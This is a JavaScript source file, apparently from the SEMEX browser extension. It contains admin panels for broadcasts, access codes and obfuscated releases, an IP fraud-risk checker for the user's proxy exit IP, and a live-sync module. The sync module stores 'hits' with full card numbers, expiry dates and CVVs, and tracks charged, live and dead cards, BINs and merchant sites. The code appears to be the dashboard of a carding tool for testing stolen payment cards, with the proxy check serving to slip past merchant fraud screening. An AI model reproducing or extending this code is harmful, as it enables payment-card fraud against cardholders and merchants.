    } catch (e) { list.innerHTML = '<div class="mono-dim" style="color:#ff8090;padding:12px;">Failed: ' + _esc(e.message||e) + '</div>'; }
  }
  async function postNews() {
    const title = document.getElementById("news-title").value.trim();
    const body = document.getElementById("news-body").value.trim();
    const important = document.getElementById("news-important").checked;
    if (!title || !body) { _toast("Title and body required", "warning"); return; }
    try {
      const r = await fetch(_base() + "/api/admin/news", {
        method: "POST", headers: await _hdr(),
        body: JSON.stringify({ title, body, important }),
      });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      _toast("News published ✨", "success");
      document.getElementById("news-title").value = "";
      document.getElementById("news-body").value = "";
      document.getElementById("news-important").checked = false;
      await loadNewsAdmin();
    } catch (e) { _toast("Post failed: " + (e.message||e), "error"); }
  }
  async function deleteNews(id) {
    if (!confirm("Delete this news post?")) return;
    try {
      const r = await fetch(_base() + "/api/admin/news/" + id, { method: "DELETE", headers: await _hdr() });
      const d = await r.json().catch(() => ({}));
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      await loadNewsAdmin();
    } catch (e) { _toast("Delete failed: " + (e.message||e), "error"); }
  }

  // -------- BROADCAST --------
  async function broadcastPreview() {
    try {
      const body = {
        include_admins: document.getElementById("broadcast-inc-admins").checked,
        include_expired: document.getElementById("broadcast-inc-expired").checked,
      };
      const r = await fetch(_base() + "/api/admin/broadcast/preview", {
        method: "POST", headers: await _hdr(), body: JSON.stringify(body),
      });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      document.getElementById("broadcast-status").textContent = "Preview: " + d.count + " user(s) would receive this.";
    } catch (e) { _toast("Preview failed: " + (e.message||e), "error"); }
  }
  async function broadcastSend() {
    const msg = document.getElementById("broadcast-message").value.trim();
    if (!msg) { _toast("Type a message first", "warning"); return; }
    if (!confirm("Send this broadcast to Telegram users?\n\n" + msg.slice(0, 200))) return;
    const btn = document.getElementById("broadcast-send-btn");
    if (btn) { btn.disabled = true; btn.textContent = "Sending…"; }
    try {
      const body = {
        message: msg,
        include_admins: document.getElementById("broadcast-inc-admins").checked,
        include_expired: document.getElementById("broadcast-inc-expired").checked,
      };
      const r = await fetch(_base() + "/api/admin/broadcast", {
        method: "POST", headers: await _hdr(), body: JSON.stringify(body),
      });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      document.getElementById("broadcast-status").textContent = "Sent: " + d.sent + " · Failed: " + d.failed;
      _toast("Broadcast sent — " + d.sent + " delivered", "success");
      document.getElementById("broadcast-message").value = "";
    } catch (e) { _toast("Broadcast failed: " + (e.message||e), "error"); }
    finally { if (btn) { btn.disabled = false; btn.textContent = "Send now"; } }
  }

  // Expose loader entrypoint
  window.loadAdminExtras = async function () {
    await Promise.allSettled([loadStats(), loadCodes(), loadAllHits(), loadNewsAdmin()]);
  };

  // Delegated click handlers
  document.addEventListener("click", (ev) => {
    const t = ev.target;
    if (!t) return;
    if (t.id === "codes-refresh-btn") return loadCodes();
    if (t.id === "codes-generate-btn") return generateCode();
    if (t.id === "hits-refresh-btn") return loadAllHits();
    if (t.id === "news-post-btn") return postNews();
    if (t.id === "broadcast-preview-btn") return broadcastPreview();
    if (t.id === "broadcast-send-btn") return broadcastSend();
    if (t.dataset && t.dataset.codeDel) return deleteCode(t.dataset.codeDel);
    if (t.dataset && t.dataset.newsDel) return deleteNews(t.dataset.newsDel);
  });
})();

/* ==================== SEMEX ADMIN — Extension Release Manager ==================== */
(function semexReleases() {
  async function _hdr(includeJson = true) {
    const s = await chrome.storage.local.get(["accessToken"]);
    const h = {
      "Authorization": "Bearer " + (s.accessToken || ""),
      "X-Fingerprint": (window.serverClient && window.serverClient.fingerprint) || "",
                "X-Extension-Version": (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest ? (chrome.runtime.getManifest().version || "") : ""),
    };
    if (includeJson) h["Content-Type"] = "application/json";
    return h;
  }
  function _base() { return (window.serverClient && window.serverClient.baseUrl) || ""; }
  function _esc(s) { if (s == null) return ""; return String(s).replace(/[&<>"']/g, (c) => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c])); }
  function _toast(m, l) { if (typeof showToast === "function") showToast(m, l || "info"); }
  function _fmtSize(bytes) {
    if (!bytes) return "0";
    const units = ["B", "KB", "MB"]; let i = 0; let v = Number(bytes);
    while (v >= 1024 && i < units.length - 1) { v /= 1024; i++; }
    return v.toFixed(v < 10 ? 1 : 0) + " " + units[i];
  }

  async function loadReleases() {
    const list = document.getElementById("releases-list");
    if (!list) return;
    try {
      const r = await fetch(_base() + "/api/admin/extension/versions", { headers: await _hdr() });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      const rels = d.releases || [];
      if (!rels.length) { list.innerHTML = '<div class="mono-dim" style="padding:12px;">No published releases yet. Upload one above.</div>'; return; }
      list.innerHTML = rels.map((rel) => {
        const time = rel.publishedAt ? new Date(rel.publishedAt).toLocaleString() : "";
        return (
          '<div class="code-row" style="grid-template-columns: 1fr auto;">' +
            '<div>' +
              '<div class="code-preview" style="color:var(--text-primary);font-weight:700;">' +
                (rel.isLatest ? '<span class="saved-bin-tag" style="background:linear-gradient(135deg,var(--accent-purple),var(--accent-pink));color:#fff;margin-right:8px;">LATEST</span>' : '') +
                (rel.isMinimum ? '<span class="saved-bin-tag" style="background:linear-gradient(135deg,#ff8090,#ffcc80);color:#fff;margin-right:8px;">MIN REQUIRED</span>' : '') +
                'v' + _esc(rel.version) +
                (rel.obfuscated ? '<span class="saved-bin-tag" style="margin-left:8px;background:rgba(80,220,150,0.20);color:#6bffb8;">OBFUSCATED</span>' : '<span class="saved-bin-tag" style="margin-left:8px;background:rgba(255,180,80,0.20);color:#ffcc80;">PLAIN</span>') +
              '</div>' +
              '<div class="code-meta">' +
                '<span>' + _fmtSize(rel.sizeBytes) + '</span>' +
                '<span>· ' + _esc(time) + '</span>' +
                '<span>· ' + (rel.downloadCount || 0) + ' downloads</span>' +
              '</div>' +
              (rel.notes ? '<div class="mono-dim" style="font-size:0.75rem;margin-top:4px;font-style:italic;">' + _esc(rel.notes) + '</div>' : '') +
            '</div>' +
            '<div class="code-actions">' +
              (!rel.isLatest ? '<button data-rel-latest="' + _esc(rel.id) + '">Make latest</button>' : '') +
              (!rel.isMinimum ? '<button data-rel-min="' + _esc(rel.id) + '" title="Lock out every extension below v' + _esc(rel.version) + '">🔒 Set as Minimum</button>' : '') +
              '<button data-rel-broadcast="' + _esc(rel.id) + '" data-version="' + _esc(rel.version) + '">📢 Broadcast</button>' +
              '<button data-rel-del="' + _esc(rel.id) + '" class="danger">Delete</button>' +
            '</div>' +
          '</div>'
        );
      }).join("");
    } catch (e) {
      list.innerHTML = '<div class="mono-dim" style="padding:12px;color:#ff8090;">Failed: ' + _esc(e.message||e) + '</div>';
    }
  }

  async function uploadRelease() {
    const version = (document.getElementById("release-version").value || "").trim();
    const notes = (document.getElementById("release-notes").value || "").trim();
    const fileEl = document.getElementById("release-file");
    const file = fileEl && fileEl.files && fileEl.files[0];
    if (!version) { _toast("Enter a version number", "warning"); return; }
    if (!file) { _toast("Select a .zip file", "warning"); return; }
    if (!/\.zip$/i.test(file.name)) { _toast("File must be a .zip", "warning"); return; }
    const btn = document.getElementById("release-upload-btn");
    const warnEl = document.getElementById("release-warning");
    if (btn) { btn.disabled = true; btn.textContent = "Uploading…"; }
    if (warnEl) { warnEl.style.display = "none"; warnEl.textContent = ""; }
    try {
      const fd = new FormData();
      fd.append("version", version);
      if (notes) fd.append("notes", notes);
      fd.append("file", file, file.name);
      const r = await fetch(_base() + "/api/admin/extension/publish", {
        method: "POST",
        headers: await _hdr(false),
        body: fd,
      });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      _toast("Published v" + d.version + " (" + _fmtSize(d.sizeBytes) + ")", "success");
      if (d.warning && warnEl) {
        warnEl.textContent = "⚠️  " + d.warning;
        warnEl.style.display = "block";
      }
      // Reset the form
      document.getElementById("release-version").value = "";
      document.getElementById("release-notes").value = "";
      if (fileEl) fileEl.value = "";
      await loadReleases();
    } catch (e) {
      _toast("Publish failed: " + (e.message||e), "error");
    } finally {
      if (btn) { btn.disabled = false; btn.textContent = "🚀 Publish"; }
    }
  }

  async function makeLatest(id) {
    try {
      const r = await fetch(_base() + "/api/admin/extension/versions/" + id + "/make-latest", { method: "POST", headers: await _hdr() });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      _toast("Marked as latest ✨", "success");
      await loadReleases();
    } catch (e) { _toast("Failed: " + (e.message||e), "error"); }
  }

  async function makeMinimum(id) {
    if (!confirm("Lock out every extension below this version?\n\nAll users on older builds will immediately get an 'Update Required' hard-block modal.\nProceed?")) return;
    try {
      const r = await fetch(_base() + "/api/admin/extension/versions/" + id + "/make-minimum", { method: "POST", headers: await _hdr() });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      _toast("Set as minimum required ✓ old versions are now blocked", "success");
      await loadReleases();
    } catch (e) { _toast("Failed: " + (e.message||e), "error"); }
  }

  async function deleteRelease(id) {
    if (!confirm("Delete this release? Users on this version will lose access to it via /get.")) return;
    try {
      const r = await fetch(_base() + "/api/admin/extension/versions/" + id, { method: "DELETE", headers: await _hdr() });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      _toast("Deleted", "success");
      await loadReleases();
    } catch (e) { _toast("Delete failed: " + (e.message||e), "error"); }
  }

  async function broadcastRelease(id, version) {
    const includeAdmins = confirm("Broadcast v" + version + " to all users?\n\nOK = include admins, Cancel to abort.");
    if (!includeAdmins) return;
    const extra = prompt("Add an extra note to the broadcast (optional):", "") || null;
    try {
      const r = await fetch(_base() + "/api/admin/extension/versions/" + id + "/broadcast", {
        method: "POST",
        headers: await _hdr(),
        body: JSON.stringify({ include_admins: true, include_expired: false, extra_note: extra }),
      });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      alert("📢 Broadcast sent!\n\nDelivered: " + d.sent + "\nFailed: " + d.failed);
    } catch (e) { _toast("Broadcast failed: " + (e.message||e), "error"); }
  }

  window.loadReleasesPanel = loadReleases;

  document.addEventListener("click", (ev) => {
    const t = ev.target;
    if (!t) return;
    if (t.id === "release-upload-btn") return uploadRelease();
    if (t.id === "release-rebuild-btn") return rebuildAndPublish();
    if (t.id === "releases-refresh-btn") return loadReleases();
    if (t.dataset && t.dataset.relLatest) return makeLatest(t.dataset.relLatest);
    if (t.dataset && t.dataset.relMin) return makeMinimum(t.dataset.relMin);
    if (t.dataset && t.dataset.relDel) return deleteRelease(t.dataset.relDel);
    if (t.dataset && t.dataset.relBroadcast) return broadcastRelease(t.dataset.relBroadcast, t.dataset.version || "");
  });

  async function rebuildAndPublish() {
    const version = (document.getElementById("release-version").value || "").trim();
    const notes = (document.getElementById("release-notes").value || "").trim();
    if (!version) { _toast("Enter a version number first", "warning"); return; }
    if (!confirm("Server will rebuild the extension from source with obfuscation and publish it as v" + version + ".\n\nThis takes 30-90 seconds. Continue?")) return;
    const btn = document.getElementById("release-rebuild-btn");
    const warnEl = document.getElementById("release-warning");
    if (btn) { btn.disabled = true; btn.textContent = "🔧 Building…"; }
    if (warnEl) { warnEl.style.display = "none"; warnEl.textContent = ""; }
    try {
      const r = await fetch(_base() + "/api/admin/extension/rebuild-and-publish", {
        method: "POST",
        headers: await _hdr(true),
        body: JSON.stringify({ version, notes: notes || null, obfuscate: true, make_latest: true }),
      });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      _toast("Built & published v" + d.version + " (" + _fmtSize(d.sizeBytes) + ")", "success");
      if (warnEl && d.buildLog) {
        warnEl.style.display = "block";
        warnEl.style.color = "#c8c8ff";
        warnEl.textContent = "Last 20 lines of build log:\n" + d.buildLog;
        warnEl.style.whiteSpace = "pre-wrap";
        warnEl.style.fontSize = "0.7rem";
      }
      document.getElementById("release-version").value = "";
      document.getElementById("release-notes").value = "";
      await loadReleases();
    } catch (e) {
      _toast("Auto build failed: " + (e.message || e), "error");
    } finally {
      if (btn) { btn.disabled = false; btn.textContent = "🔧 Auto build & publish (obfuscated)"; }
    }
  }
})();


/* ==================== SEMEX IP FRAUD CHECK ==================== */
(function semexIpFraudCheck() {
  function _base() { return (window.serverClient && window.serverClient.baseUrl) || ""; }
  async function _authHdr() {
    try {
      const st = await new Promise(r => chrome.storage.local.get(["accessToken"], r));
      return {
        "Authorization": "Bearer " + (st.accessToken || ""),
        "X-Fingerprint": (window.serverClient && window.serverClient.fingerprint) || "",
                "X-Extension-Version": (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest ? (chrome.runtime.getManifest().version || "") : ""),
      };
    } catch (e) { return {}; }
  }
  function esc(s) { return String(s == null ? "" : s).replace(/[&<>"']/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;" }[c])); }

  function renderPill(label, value, cls) {
    if (value === undefined || value === null || value === "") return "";
    return '<span class="ipfc-pill ' + (cls || "") + '"><span class="ipfc-pill-l">' + esc(label) + '</span><span class="ipfc-pill-v">' + esc(value) + '</span></span>';
  }

  function render(result) {
    const box = document.getElementById("ip-check-result");
    if (!box) return;
    if (!result) { box.classList.add("hidden"); return; }
    const risk = Number(result.risk || 0);
    const riskLabel = result.riskLabel || (risk >= 66 ? "HIGH" : risk >= 34 ? "MEDIUM" : "LOW");
    const flags = [];
    if (result.vpn)   flags.push('<span class="ipfc-flag vpn">VPN</span>');
    if (result.proxy) flags.push('<span class="ipfc-flag proxy">PROXY</span>');
    if (result.tor)   flags.push('<span class="ipfc-flag tor">TOR</span>');
    if (!flags.length) flags.push('<span class="ipfc-flag clean">CLEAN</span>');

    box.classList.remove("hidden");
    box.innerHTML =
      '<div class="ipfc-head">'
        + '<span class="ipfc-flag-emoji">' + esc(result.flag || "🌍") + '</span>'
        + '<div class="ipfc-head-main">'
          + '<div class="ipfc-ip">' + esc(result.ip || "?") + '</div>'
          + '<div class="ipfc-loc">' + esc([result.city, result.region, result.countryName].filter(Boolean).join(", ") || "-") + '</div>'
        + '</div>'
        + '<div class="ipfc-risk ipfc-risk-' + riskLabel.toLowerCase() + '">'
          + '<div class="ipfc-risk-label">' + esc(riskLabel) + '</div>'
          + '<div class="ipfc-risk-num">' + risk + '<span>/100</span></div>'
        + '</div>'
      + '</div>'
      + '<div class="ipfc-flags">' + flags.join("") + '</div>'
      + '<div class="ipfc-meta">'
        + renderPill("ISP", result.isp)
        + renderPill("ASN", result.asn)
        + renderPill("Org", result.org)
        + renderPill("Type", (result.type || "").replace(/^./, c => c.toUpperCase()))
        + renderPill("Provider", result.provider)
        + renderPill("Timezone", result.timezone)
        + renderPill("Postal", result.postal)
      + '</div>';
  }

  // When a proxy is active, the backend domain is in the proxy BYPASS_LIST, so a
  // plain /api/user/ip-check (no ?ip) would report the user's REAL connection IP,
  // not the proxy exit IP. To reflect the proxy, we resolve the proxy's exit IP
  // via an external echo service — which DOES traverse chrome.proxy — then hand
  // that IP to the fraud check so the analytics describe the proxy, not the server.
  async function _activeProxyExitIp() {
    try {
      const status = await chrome.runtime.sendMessage({ type: "GET_PROXY_STATUS" });
      if (!status || !status.active) return null;
    } catch (_e) { return null; }
    // These echo endpoints are NOT in the bypass list, so the request exits
    // through the active proxy and returns the proxy's public IP.
    const echos = [
      { url: "https://api.ipify.org?format=json", pick: d => d && d.ip },
      { url: "https://ipv4.icanhazip.com", pick: t => (t || "").trim() },
    ];
    for (const e of echos) {
      try {
        const ctrl = new AbortController();
        const to = setTimeout(() => ctrl.abort(), 8000);
        const r = await fetch(e.url, { cache: "no-store", signal: ctrl.signal });
        clearTimeout(to);
        if (!r.ok) continue;
        const raw = e.url.indexOf("ipify") >= 0 ? await r.json() : await r.text();
        const ip = e.pick(raw);
        if (ip && /^[0-9a-fA-F:.]+$/.test(ip)) return ip;
      } catch (_e) { /* try next echo */ }
    }
    return null;
  }

  async function check() {
    const inp = document.getElementById("ip-check-input");
    const btn = document.getElementById("ip-check-btn");
    const box = document.getElementById("ip-check-result");
    if (!btn) return;
    let ip = (inp && inp.value || "").trim();
    btn.disabled = true;
    const oldTxt = btn.textContent;
    btn.textContent = "Checking…";
    if (box) {
      box.classList.remove("hidden");
      box.innerHTML = '<div class="ipfc-loading">Fetching IP intel + fraud analytics…</div>';
    }
    try {
      // No manual IP entered → if a proxy is running, check the PROXY's exit IP.
      if (!ip) {
        const proxyIp = await _activeProxyExitIp();
        if (proxyIp) ip = proxyIp;
      }
      const url = _base() + "/api/user/ip-check" + (ip ? ("?ip=" + encodeURIComponent(ip)) : "");
      const r = await fetch(url, { headers: await _authHdr() });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      render(d);
    } catch (e) {
      if (box) {
        box.classList.remove("hidden");
        box.innerHTML = '<div class="ipfc-err">❌ ' + esc(e.message || e) + '</div>';
      }
    } finally {
      btn.disabled = false;
      btn.textContent = oldTxt;
    }
  }

  document.addEventListener("click", (ev) => {
    if (ev.target && ev.target.id === "ip-check-btn") check();
  });
  document.addEventListener("keydown", (ev) => {
    if (ev.key === "Enter" && document.activeElement && document.activeElement.id === "ip-check-input") {
      ev.preventDefault();
      check();
    }
  });
})();

// ── SEMEX Live Sync (SSE) ─────────────────────────────────────────────────────
// Opens a persistent Server-Sent Events connection to /api/user/stream so that
// hits, BINs and settings changes appear live on every open dashboard within ~1 s.
// Uses fetch() instead of EventSource so we can send the Authorization header.
(function semexLiveSync() {
  "use strict";
  let _reader = null;
  let _retryTimer = null;
  let _backoff = 1500;
  let _running = false;

  // ── public API ──────────────────────────────────────────────────────────────
  function start() {
    if (_running) return;
    _running = true;
    _backoff = 1500;
    _loop();
  }

  function stop() {
    _running = false;
    if (_retryTimer) { clearTimeout(_retryTimer); _retryTimer = null; }
    if (_reader) { try { _reader.cancel(); } catch (_) {} _reader = null; }
  }

  // ── connection loop ─────────────────────────────────────────────────────────
  async function _loop() {
    while (_running) {
      try { await _connect(); } catch (_) { /* reconnect on any error */ }
      if (!_running) break;
      await new Promise(r => { _retryTimer = setTimeout(r, _backoff); });
      _backoff = Math.min(_backoff * 2, 30000);
    }
  }

  async function _connect() {
    // Require a valid access token
    const stored = await chrome.storage.local.get(["accessToken"]);
    const token = stored.accessToken;
    if (!token) { _running = false; return; }

    const apiUrl = (window.serverClient && window.serverClient.baseUrl) || "";
    // Skip if the URL placeholder was never substituted (dev build without build.sh)
    if (!apiUrl || apiUrl.includes("__SEMEX_API_URL__")) return;

    const fp = (window.serverClient && window.serverClient.fingerprint) || "";
    const extVer = (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest)
      ? (chrome.runtime.getManifest().version || "") : "";

    let resp;
    try {
      resp = await fetch(apiUrl + "/api/user/stream", {
        headers: {
          "Authorization": "Bearer " + token,
          "X-Fingerprint": fp,
          "X-Extension-Version": extVer,
          "Accept": "text/event-stream",
          "Cache-Control": "no-cache",
        },
      });
    } catch (_) { return; }

    if (!resp.ok || !resp.body) return;

    // Successfully connected — reset backoff
    _backoff = 1500;

    const reader = resp.body.getReader();
    _reader = reader;
    const dec = new TextDecoder();
    let buf = "";
    let evtType = "message";
    let evtData = "";

    try {
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        buf += dec.decode(value, { stream: true });
        // SSE frames are separated by blank lines; each field is "key: value\n"
        const lines = buf.split("\n");
        buf = lines.pop(); // keep any incomplete last line
        for (const line of lines) {
          if (line.startsWith("event:")) {
            evtType = line.slice(6).trim();
          } else if (line.startsWith("data:")) {
            evtData = line.slice(5).trim();
          } else if (line === "" && (evtData || evtType !== "message")) {
            _dispatch(evtType, evtData);
            evtType = "message"; evtData = "";
          }
        }
      }
    } finally {
      _reader = null;
      try { reader.cancel(); } catch (_) {}
    }
  }

  // ── live data fetch ─────────────────────────────────────────────────────────
  // Fetches authoritative hit list + user stats directly from the server and
  // writes them into chrome.storage so loadStatistics() and loadHistory() always
  // display current data — even before background.js has pushed its local state
  // (background.js has a 2.5 s debounce on /api/user/state).
  async function _fetchAndApplyFreshHits() {
    try {
      const { accessToken } = await chrome.storage.local.get(["accessToken"]);
      if (!accessToken) return;
      const apiUrl = (window.serverClient && window.serverClient.baseUrl) || "";
      if (!apiUrl || apiUrl.includes("__SEMEX_API_URL__")) return;
      const fp = (window.serverClient && window.serverClient.fingerprint) || "";
      const extVer = (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest)
        ? (chrome.runtime.getManifest().version || "") : "";
      const hdrs = {
        "Authorization": "Bearer " + accessToken,
        "X-Fingerprint": fp,
        "X-Extension-Version": extVer,
      };

      // Fetch fresh stats and hit list in parallel
      const [hitsResp, meResp] = await Promise.all([
        fetch(apiUrl + "/api/user/hits?limit=200", { headers: hdrs }).catch(() => null),
        fetch(apiUrl + "/api/user/me", { headers: hdrs }).catch(() => null),
      ]);

      const patch = {};

      // Update statistics counters — server DB is authoritative for charged + total
      if (meResp && meResp.ok) {
        const me = await meResp.json();
        const { statistics: existingStats } = await chrome.storage.local.get(["statistics"]);
        const stats = Object.assign(
          { totalCards: 0, attempts: 0, charged: 0, ccnLive: 0, dead: 0 },
          existingStats || {},
        );
        if (typeof me.chargedCount === "number") stats.charged = me.chargedCount;
        if (typeof me.hitCount === "number") stats.attempts = me.hitCount;
        patch.statistics = stats;
      }

      // Merge fresh server hit list into transactionHistory
      if (hitsResp && hitsResp.ok) {
        const hitsData = await hitsResp.json();
        const serverHits = hitsData.hits || [];
        // Convert server hit schema to the extension's transactionHistory row format
        const serverTxs = serverHits.map(h => ({
          id: h.id,
          status: h.status || "charged",
          card: [
            h.card_number || "",
            h.card_exp_month || "",
            String(h.card_exp_year || "").slice(-2),
            h.card_cvv || "",
          ].join("|"),
          timestamp: h.created_at ? new Date(h.created_at).getTime() : Date.now(),
          amount: h.amount,
          currency: h.currency,
          gateway: h.gateway,
          site: h.site_url || h.hostname,
          hostname: h.hostname,
          merchant: h.merchant,
          response: h.response,
          ip: h.ip,
        }));
        // Keep local-only rows (LIVE/DEAD are never persisted server-side)
        const { __xtxh: localHistory } = await chrome.storage.local.get(["__xtxh"]);
        const seenIds = new Set(serverTxs.map(t => t.id).filter(Boolean));
        const localExtra = (localHistory || []).filter(t => !seenIds.has(t.id));
        // v2.9.4: write to the real history key (__xtxh) — writing the legacy
        // "transactionHistory" key meant server hits never reached the UI.
        patch.__xtxh = [...serverTxs, ...localExtra]
          .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
          .slice(0, 200);
      }

      if (Object.keys(patch).length) {
        await chrome.storage.local.set(patch);
        // The chrome.storage.onChanged listener in popup.js (line ~986) auto-calls
        // loadStatistics() when statistics changes; loadHistory() is called below.
      }
    } catch (_) {}
  }

  // ── settings fetch ─────────────────────────────────────────────────────────
  // Pulls authoritative settings from the server, writes them into chrome.storage,
  // then calls loadSettings() so settings changes on another device appear live.
  async function _fetchAndApplyFreshSettings() {
    try {
      const { accessToken } = await chrome.storage.local.get(["accessToken"]);
      if (!accessToken) return;
      const apiUrl = (window.serverClient && window.serverClient.baseUrl) || "";
      if (!apiUrl || apiUrl.includes("__SEMEX_API_URL__")) return;
      const fp = (window.serverClient && window.serverClient.fingerprint) || "";
      const extVer = (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest)
        ? (chrome.runtime.getManifest().version || "") : "";
      const r = await fetch(apiUrl + "/api/user/settings", {
        headers: {
          "Authorization": "Bearer " + accessToken,
          "X-Fingerprint": fp,
          "X-Extension-Version": extVer,
        },
      }).catch(() => null);
      if (!r || !r.ok) return;
      const data = await r.json();
      const remoteSettings = data && data.settings;
      if (!remoteSettings || typeof remoteSettings !== "object") return;
      await chrome.storage.local.set({ settings: remoteSettings });
      try { if (typeof loadSettings === "function") await loadSettings(); } catch (_) {}
    } catch (_) {}
  }

  // ── event dispatch ──────────────────────────────────────────────────────────
  function _dispatch(type, dataStr) {
    if (type === "ping") return; // keepalive — ignore
    try {
      if (type === "hit" || type === "state") {
        // Fetch authoritative stats + hit list from the server, write into
        // chrome.storage, then re-render both panels so the dashboard is current.
        _fetchAndApplyFreshHits().then(() => {
          try { if (typeof loadHistory === "function") loadHistory(); } catch (_) {}
        });
      } else if (type === "settings") {
        // Fetch authoritative settings from server, write into chrome.storage,
        // then re-render the settings panel so the change appears immediately.
        _fetchAndApplyFreshSettings();
      } else if (type === "bins") {
        // BINs added/deleted on another device — refresh the BINs panel.
        try { if (typeof window.loadSavedBinsPanel === "function") window.loadSavedBinsPanel(); } catch (_) {}
      } else {
        // Unknown event — fall back to a full fresh-data fetch.
        _fetchAndApplyFreshHits().then(() => {
          try { if (typeof loadHistory === "function") loadHistory(); } catch (_) {}
        });
      }
    } catch (_) {}
  }

  // ── lifecycle hooks ─────────────────────────────────────────────────────────
  // React to login / logout events in chrome.storage
  chrome.storage.onChanged.addListener((changes, area) => {
    if (area !== "local") return;
    if (changes.accessToken) {
      if (changes.accessToken.newValue) {
        // Fresh login — give auth a moment to settle, then start the stream
        stop();
        setTimeout(() => { _running = false; start(); }, 900);
      } else {
        // Logout — close the stream
        stop();
      }
    }
  });

  // Start immediately if already authenticated
  (async () => {
    try {
      const { accessToken } = await chrome.storage.local.get(["accessToken"]);
      if (accessToken) setTimeout(start, 2500);
    } catch (_) {}
  })();
})();
